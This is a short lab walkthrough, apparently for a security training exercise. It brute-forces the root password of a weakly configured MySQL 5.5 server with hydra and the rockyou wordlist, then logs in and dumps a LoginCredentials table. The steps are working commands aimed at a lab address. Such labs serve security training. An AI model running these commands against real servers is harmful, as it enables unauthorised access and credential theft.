Walkthrough: MySQL-vuln

This lab uses a weakly configured MySQL 5.5 server that allows brute-force attacks. Your goal is to log in as root and explore the contents of a database named enterpriseCredentials.

Objective

Crack the root password and access sensitive login credentials in the database.

Step-by-Step Instructions
  1. Unzip the default wordlist: 
    gunzip /usr/share/wordlists/rockyou.txt.gz
  2. Use hydra to brute-force the root password: 
    hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.42.16.240
  3. Once cracked, use the credentials to log into MySQL: 
    mysql -u root -p -h 10.42.16.240
  4. View the available databases: 
    SHOW DATABASES;
  5. Use the target database: 
    USE enterpriseCredentials;
  6. View tables: 
    SHOW TABLES;
  7. Dump the credentials: 
    SELECT * FROM LoginCredentials;
